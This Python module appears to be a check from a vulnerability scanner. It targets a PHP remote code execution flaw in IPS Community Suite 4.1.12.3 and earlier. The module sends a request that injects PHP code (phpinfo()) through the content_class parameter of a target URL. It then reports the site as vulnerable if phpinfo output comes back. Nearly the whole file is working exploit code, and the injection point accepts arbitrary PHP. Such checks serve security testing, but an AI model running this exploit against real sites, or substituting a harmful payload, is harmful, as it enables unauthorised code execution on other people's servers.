#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: IPS Community Suite <= 4.1.12.3 PHP远程代码执行
referer: https://www.seebug.org/vuldb/ssvid-92096
author: Ascotbe
reference: Lucifer
description: IPS Community Suite "是一款国外比较常见的cms。
    但在其4.1.12.3版本及以下版本，存在PHP代码注入漏洞，该漏洞源于程序未能充分过滤content_class请求参数。
    远程攻击者可利用该漏洞注入并执行任意PHP代码。
    漏洞触发条件:
    IPS版本：<=4.1.12.3
    php环境：<=5.4.24和5.5.0-5.5.8
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('configuration file (php.ini) path')!=-1:
            Medusa = "{} 存在IPS Community Suite <= 4.1.12.3 PHP远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass